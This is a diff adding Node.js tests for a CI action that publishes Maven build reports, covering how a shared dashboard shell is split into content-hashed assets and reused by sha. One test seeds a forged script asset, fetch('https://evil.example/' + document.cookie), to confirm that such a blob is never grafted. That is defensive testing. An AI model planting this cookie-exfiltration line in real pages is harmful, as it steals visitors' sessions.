@@ -15,8 +15,9 @@ const path = require('path');
 const { spawn } = require('child_process');
 const { run, keyFor, reportLabels, describeFailure } = require('../src/report');
 const { GitStoreError } = require('../src/gitstore');
+const { compressReportHtml, splitReportHtml } = require('../src/mvnlens');
 const { createFakeGitHub } = require('./fake-github');
-const { tmpDir, fakeReportHtml, fixtureModel, fakeRun, withEnv, captureOutputs } = require('./helpers');
+const { tmpDir, fakeReportHtml, fakeShellReportHtml, fixtureModel, fakeRun, withEnv, captureOutputs } = require('./helpers');
 
 const ROOT = path.join(__dirname, '..');
 const REPO = 'acme/widgets';
@@ -82,6 +83,17 @@ function writeReport(file, model, htmlOpts, writtenAt) {
   const t = (writtenAt || REPORT_WRITTEN_AT) / 1000;
   fs.utimesSync(file, t, t);
   return file;
+}
+
+/** A workspace whose report carries the real six-block shell — the one splitReportHtml lifts out. */
+function shellWorkspace(model) {
+  const dir = tmpDir('report');
+  const file = path.join(dir, 'target', 'mvnlens', 'report.html');
+  fs.mkdirSync(path.dirname(file), { recursive: true });
+  fs.writeFileSync(file, fakeShellReportHtml(model || fixtureModel()));
+  const t = REPORT_WRITTEN_AT / 1000;
+  fs.utimesSync(file, t, t);
+  return { dir, file };
 }
 
 async function inDir(dir, fn) {
@@ -513,6 +525,161 @@ test('compress: false publishes the original bytes; a report without pako is pub
   assert.match(kept.stdout, /not compressed \(renderer has no gzip decoder\)/);
   assert.equal(inboxMeta(fake, `j${JOB_ID}-s3-nopako`).reports[0].compressed, false);
   assert.ok(!String(inboxFile(fake, `reports/${RUN_ID}/j${JOB_ID}-s3-nopako/report.html`)).includes('gzip:'));
+});
+
+// ---------------------------------------------------------------------------
+// The shared dashboard shell
+// ---------------------------------------------------------------------------
+
+test('the dashboard shell is split out beside the report and referenced from it, bootstrap last', async () => {
+  const fake = scenario();
+  const ws = shellWorkspace();
+  const { res, out, stdout } = await runReport(fake, ws.dir);
+  assert.equal(res.exitCode, 0, stdout);
+  assert.equal(out.published, 'true');
+  const dir = `reports/${RUN_ID}/j${JOB_ID}-s3`;
+  const names = fake.store.listDir(INBOX, dir);
+  const shell = names.filter(n => n.startsWith('lens-'));
+  assert.equal(shell.length, 3, `one stylesheet and two scripts: ${names.join(', ')}`);
+  // The assets travel INSIDE the key directory: a valid inbox path is exactly
+  // reports/<runId>/<key>/<file>, which leaves no room for a root-level one.
+  // Lifting them to <site>/assets/ is the processor's job.
+  assert.deepEqual(names, shell.concat(['meta.json', 'report.html']));
+  for (const n of shell) assert.match(n, /^lens-[0-9a-f]{12}\.(?:js|css)$/, 'the name the processor whitelists');
+
+  // Every reference is '../../../assets/<name>' — from
+  // reports/<runId>/<key>/report.html exactly the site root — and the
+  // bootstrap, which reads the model with getElementById("mvnlens-data"),
+  // still loads AFTER the block it reads.
+  const html = String(inboxFile(fake, `${dir}/report.html`));
+  const body = n => String(inboxFile(fake, `${dir}/${n}`));
+  const at = n => { const i = html.indexOf(`<script src="../../../assets/${n}"></script>`); assert.ok(i >= 0, `${n} is referenced`); return i; };
+  const css = shell.find(n => n.endsWith('.css'));
+  const app = shell.find(n => body(n).includes('getElementById("mvnlens-data")'));
+  const vendor = shell.find(n => n.endsWith('.js') && n !== app);
+  const data = html.indexOf('<script id="mvnlens-data" type="application/json">');
+  assert.ok(html.includes(`<link rel="stylesheet" href="../../../assets/${css}">`), 'the stylesheet is a <link>');
+  assert.ok(html.indexOf(`../../../assets/${css}`) < data, 'the stylesheet loads before the data block');
+  assert.ok(at(vendor) < data, 'pako and the other vendor libraries load before the data block');
+  assert.ok(at(app) > data, 'the bootstrap still loads AFTER the block it reads by id');
+  assert.ok(body(vendor).includes('/*! pako'), 'the vendor bundle');
+
+  // The bytes left the published copy; the file on disk keeps them (it is the CI artifact).
+  const original = fs.readFileSync(ws.file, 'utf8');
+  assert.ok(Buffer.byteLength(html) * 4 < Buffer.byteLength(original), `${Buffer.byteLength(html)} published of ${Buffer.byteLength(original)}`);
+  assert.ok(original.includes('<style>'), 'the report on disk still carries its shell inline');
+  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3`).reports[0].bytes, Buffer.byteLength(html), 'meta counts what was published');
+  assert.match(stdout, /shell split into 3 shared asset\(s\)/);
+  assert.ok(!stdout.includes('::warning::'), stdout);
+});
+
+test('the shell travels once per run: another job grafts it by sha, a re-run commits nothing', async () => {
+  const fake = scenario();
+  const build = shellWorkspace();
+  const first = await runReport(fake, build.dir);
+  assert.equal(first.res.exitCode, 0, first.stdout);
+  const mark = fake.calls.length;
+
+  // The lint job of the same run publishes its own report, built by the same
+  // mvn-lens: another key directory, the very same shell.
+  const model = fixtureModel();
+  model.session.totalMs = 4242;
+  const second = await runReport(fake, shellWorkspace(model).dir, { RUNNER_NAME: 'GitHub Actions 8', GITHUB_JOB: 'lint', BUILD_MONITOR_DEBUG: '1' });
+  assert.equal(second.res.exitCode, 0, second.stdout);
+  assert.notEqual(second.out.key, first.out.key);
+  const dirA = `reports/${RUN_ID}/${first.out.key}`;
+  const dirB = `reports/${RUN_ID}/${second.out.key}`;
+  const shell = fake.store.listDir(INBOX, dirA).filter(n => n.startsWith('lens-'));
+  assert.equal(shell.length, 3);
+  assert.deepEqual(fake.store.listDir(INBOX, dirB).filter(n => n.startsWith('lens-')), shell, 'content-hashed: the same shell, the same names');
+  for (const n of shell) assert.ok(Buffer.compare(inboxFile(fake, `${dirA}/${n}`), inboxFile(fake, `${dirB}/${n}`)) === 0, n);
+  const posts = fake.calls.slice(mark).filter(c => c.method === 'POST' && c.path.endsWith('/git/blobs'));
+  assert.equal(posts.length, 2, 'report.html and meta.json: the shell was grafted by sha, not uploaded a second time');
+  assert.match(second.stdout, new RegExp(`\\[debug\\].*already in the inbox of run ${RUN_ID}`));
+
+  // The assets are pushed on every publish, up to date or not — and the commit
+  // is still a no-op, because each path already holds exactly those bytes.
+  const head = fake.store.headOf(INBOX);
+  const again = await runReport(fake, build.dir);
+  assert.equal(again.out.published, 'true');
+  assert.equal(again.out['commit-sha'], head, 'no new commit');
+  assert.match(again.stdout, /already up to date/);
+});
+
+test('two reports of one step contribute one set of assets, not one set each', async () => {
+  const fake = scenario();
+  const dir = tmpDir('multi-shell');
+  for (const [mod, totalMs] of [['core', 7975], ['web', 4242]]) {
+    const model = fixtureModel();
+    model.session.totalMs = totalMs;
+    const file = path.join(dir, mod, 'target', 'mvnlens', 'report.html');
+    fs.mkdirSync(path.dirname(file), { recursive: true });
+    fs.writeFileSync(file, fakeShellReportHtml(model));
+    fs.utimesSync(file, REPORT_WRITTEN_AT / 1000, REPORT_WRITTEN_AT / 1000);
+  }
+  const { res, out, stdout } = await runReport(fake, dir, { INPUT_REPORT: '**/target/mvnlens/report.html' });
+  assert.equal(res.exitCode, 0, stdout);
+  // Both reports carry the same shell, so both name the same three assets. One
+  // entry per report would be a duplicate path, which aborts the whole commit:
+  // the step stays green and publishes nothing at all.
+  assert.equal(out.published, 'true', stdout);
+  assert.ok(!stdout.includes('duplicate path'), stdout);
+  const keyDir = `reports/${RUN_ID}/j${JOB_ID}-s3`;
+  const names = fake.store.listDir(INBOX, keyDir);
+  const shell = names.filter(n => n.startsWith('lens-'));
+  assert.equal(shell.length, 3, `one stylesheet and two scripts for the two reports: ${names.join(', ')}`);
+  assert.deepEqual(names, shell.concat(['meta.json', 'report-2.html', 'report.html']));
+  for (const rep of ['report.html', 'report-2.html']) {
+    const html = String(inboxFile(fake, `${keyDir}/${rep}`));
+    for (const n of shell) assert.ok(html.includes(`<link rel="stylesheet" href="../../../assets/${n}">`) || html.includes(`<script src="../../../assets/${n}"></script>`), `${rep} references ${n}`);
+  }
+  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3`).reports.length, 2);
+});
+
+test('an asset name the inbox already holds with OTHER bytes is uploaded, never grafted', async () => {
+  const fake = scenario();
+  const ws = shellWorkspace();
+  // Exactly what this job will publish — the action compresses, then splits.
+  const split = splitReportHtml(compressReportHtml(fs.readFileSync(ws.file, 'utf8')).html);
+  assert.equal(split.split, true, split.reason);
+  const target = split.assets.find(a => a.name.endsWith('.js'));
+
+  // The inbox is written by build jobs holding a contents:write token, so
+  // another key directory of the same run can carry a well-formed asset NAME
+  // over bytes nobody hashed. The name proves nothing; only the sha does.
+  const forged = 'fetch("https://evil.example/" + document.cookie);\n';
+  fake.store.seedBranch(INBOX, { [`reports/${RUN_ID}/jOTHER-s1/${target.name}`]: forged });
+
+  const { res, out, stdout } = await runReport(fake, ws.dir, { BUILD_MONITOR_DEBUG: '1' });
+  assert.equal(res.exitCode, 0, stdout);
+  assert.equal(out.published, 'true');
+  const got = inboxFile(fake, `reports/${RUN_ID}/${out.key}/${target.name}`);
+  assert.ok(Buffer.compare(got, target.content) === 0, 'the job uploaded its own bytes');
+  assert.ok(!String(got).includes('evil.example'), 'the forged blob was not grafted into this key — the processor would lift it to the site root, and every report on the site loads it');
+  assert.ok(!stdout.includes(`${target.name} is already in the inbox`), stdout);
+
+  // The sha check is what makes the difference: the same name over the SAME
+  // bytes elsewhere in the run is still grafted rather than re-uploaded.
+  const other = split.assets.find(a => a.name.endsWith('.css'));
+  fake.store.seedBranch(INBOX, { [`reports/${RUN_ID}/jOTHER-s1/${other.name}`]: other.content.toString('utf8') });
+  const again = await runReport(fake, shellWorkspace().dir, { RUNNER_NAME: 'GitHub Actions 8', GITHUB_JOB: 'lint', BUILD_MONITOR_DEBUG: '1' });
+  assert.equal(again.res.exitCode, 0, again.stdout);
+  assert.match(again.stdout, new RegExp(`${other.name} is already in the inbox`));
+  const grafted = inboxFile(fake, `reports/${RUN_ID}/${again.out.key}/${other.name}`);
+  assert.ok(Buffer.compare(grafted, other.content) === 0, 'grafted by sha: the bytes are the ones this job hashed');
+  const js = inboxFile(fake, `reports/${RUN_ID}/${again.out.key}/${target.name}`);
+  assert.ok(!String(js).includes('evil.example'), 'the forged name is still not trusted, whichever job publishes next');
+});
+
+test('compress: false publishes the report whole: the shell is not split either', async () => {
+  const fake = scenario();
+  const ws = shellWorkspace();
+  const { res, out, stdout } = await runReport(fake, ws.dir, { INPUT_COMPRESS: 'false' });
+  assert.equal(res.exitCode, 0, stdout);
+  assert.equal(out.published, 'true');
+  const dir = `reports/${RUN_ID}/j${JOB_ID}-s3`;
+  assert.deepEqual(fake.store.listDir(INBOX, dir), ['meta.json', 'report.html'], 'nothing but the report set');
+  assert.ok(Buffer.compare(inboxFile(fake, `${dir}/report.html`), fs.readFileSync(ws.file)) === 0, 'byte-identical');
 });
 
 test('the repository sample report with label "sample" (what the CI self-test publishes)', async () => {
